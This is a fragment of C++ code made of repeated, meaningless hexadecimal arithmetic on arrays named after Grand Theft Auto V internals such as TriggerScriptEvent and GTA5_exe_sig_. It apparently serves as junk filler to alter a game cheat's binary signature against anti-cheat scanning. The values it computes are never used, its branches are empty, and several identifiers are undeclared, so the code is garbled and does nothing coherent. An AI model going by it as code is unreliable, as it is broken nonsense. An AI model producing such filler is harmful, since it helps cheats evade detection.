			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			std::vector<std::string> tokens;

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
